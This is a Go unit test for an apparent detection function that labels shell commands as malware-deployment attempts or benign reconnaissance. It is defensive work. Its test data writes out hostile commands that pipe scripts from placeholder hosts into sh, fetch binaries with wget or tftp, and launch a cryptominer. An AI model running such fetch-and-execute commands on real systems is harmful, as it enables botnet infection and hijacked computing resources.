package actor

import "testing"

func TestLooksLikeDeployCmd(t *testing.T) {
	deploy := []string{
		"curl http://1.2.3.4/x.sh | sh",
		"wget http://evil/m -O /tmp/m",
		"cd /tmp/ && curl -o a http://h/a",
		"chmod +x /tmp/payload",
		"chmod 777 ./bot",
		"busybox wget http://h/x; sh /tmp/x",
		"tftp -g -r mips 1.2.3.4 | sh",
		"./xmrig",
		"sh /tmp/run.sh",
	}
	for _, c := range deploy {
		if !looksLikeDeployCmd(c) {
			t.Errorf("expected deploy=true for %q", c)
		}
	}

	// Recon / benign commands that the old substring heuristic mis-flagged.
	notDeploy := []string{
		"ls /tmp/",            // bare /tmp listing — the classic false positive
		"ls -la /tmp",         //
		"cat /tmp/whatever",   // read, not execute
		"uname -a",            //
		"cat /proc/cpuinfo",   //
		"echo curl",           // mentions curl, does nothing
		"which wget",          // probes for a downloader, doesn't use one
		"df -h /tmp/",         //
		"",                    //
	}
	for _, c := range notDeploy {
		if looksLikeDeployCmd(c) {
			t.Errorf("expected deploy=false for %q", c)
		}
	}
}
